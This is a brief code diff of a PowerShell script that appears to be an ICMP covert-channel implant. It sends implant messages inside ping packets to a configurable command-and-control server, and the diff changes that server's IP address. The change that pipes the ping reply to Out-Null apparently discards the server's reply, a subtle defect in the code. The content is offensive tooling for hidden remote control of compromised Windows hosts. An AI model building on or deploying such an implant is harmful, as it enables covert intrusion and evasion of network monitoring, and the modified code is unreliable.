@@ -17,7 +17,7 @@ enum ServerMessageType {
 }
 
 # Configure me!
-$ServerIPAddress = '10.0.0.94'
+$ServerIPAddress = '10.0.0.189'
 $BufferSize = 65535
 $PingTimeout = 10 * 1000
 
@@ -27,7 +27,7 @@ $PingOptions.DontFragment = $true
 
 Function Send-ICMPMessage([ImplantMessageType]$MessageType, [Byte[]]$Data = @()) {
   $MessageBytes = @($MessageType) + $Data
-  $Reply = $Ping.Send($ServerIPAddress, $PingTimeout, $MessageBytes, $PingOptions)
+  $Reply = $Ping.Send($ServerIPAddress, $PingTimeout, $MessageBytes, $PingOptions) | Out-Null
   return $Reply
 }
 
